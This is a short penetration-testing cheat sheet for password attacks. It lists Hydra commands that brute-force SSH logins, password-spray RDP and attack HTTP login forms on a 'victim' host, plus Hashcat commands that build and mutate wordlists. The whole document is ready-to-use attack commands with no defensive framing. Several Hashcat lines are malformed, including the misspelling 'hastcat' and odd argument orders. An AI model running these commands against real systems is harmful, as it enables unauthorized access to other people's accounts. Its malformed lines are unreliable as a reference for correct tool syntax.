# Password attacks

## Hydra

### Wordlist

```
hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
```

### Spraying

```
hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
```

### Http

```
hydra -P wordlist.txt http-post-form $IpVictim "/baseurl:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
hydra -l user -P wordlist.txt http-get $IpVictim
```

## Hashcat

```
hashcat wordlist.txt -j 'd' wordlist.txt --stdout > newwordlist.txt
hastcat wordlist.txt -r rulelist.txt --stdout
hashcat -m 0 wordlist.txt -k 'u' newwordlist.txt --force
```


